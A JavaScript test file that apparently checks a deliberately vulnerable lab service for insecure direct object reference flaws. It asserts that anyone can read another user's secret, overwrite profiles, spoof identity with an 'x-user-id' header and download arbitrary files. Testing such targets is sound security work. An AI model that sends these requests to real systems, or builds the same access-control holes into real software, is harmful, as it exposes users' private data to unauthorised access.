// test/vulnerable_idor.test.js

import { strict as assert } from 'assert';
import supertest from 'supertest';

// Base URL for the running service (assuming it's accessible at localhost:3000)
const baseUrl = 'http://defboxlocaltarget:3005';

describe('IDOR Vulnerability Tests', () => {
    it('should allow access to user 1 data by any user', async () => {
        const response = await supertest(baseUrl)
            .get('/user/1')
            .expect(200);

        assert.equal(response.body.user.secret, 'Admin Secret');
    });

    it('should allow an attacker to update any users profile data', async () => {
        const postData = {
            userId: 1,
            newProfileData: 'testing'
        };
        const update = await supertest(baseUrl)
            .post('/updateProfile')
            .send(postData)
            .expect(200);
        const response = await supertest(baseUrl)
            .get('/user/1')
            .expect(200);

        assert.equal(response.body.user.profile, 'testing');
    });

    it('should allow an attacker to get direct user access if userId is in the header', async () => {
        const response = await supertest(baseUrl)
            .get('/getUserData')
            .set('x-user-id', 1)
            .expect(200);
        assert.equal(response.body.user.secret, 'Admin Secret');
    });

    it('should allow an attacker to pull any file they want', async () => {
        const response = await supertest(baseUrl)
            .get('/files/secret.txt')
            .expect(200);
        assert.equal(response.text, 'S3c12ET');
    });


    // Add more test cases as needed
});
